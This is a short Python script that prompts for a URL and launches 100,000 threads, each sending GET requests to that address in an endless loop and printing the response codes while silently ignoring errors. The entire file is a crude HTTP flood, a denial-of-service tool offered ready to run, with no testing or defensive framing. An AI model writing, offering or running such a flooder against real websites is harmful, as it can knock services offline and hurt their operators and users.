import requests
import threading
url = input("URL> ")

def yes():
    while True:
        try:
            response = requests.get(url)
            print("CODE: " + str(response.status_code))
        except:
            pass

for i in range(100000): 
    threading.Thread(target=yes).start()
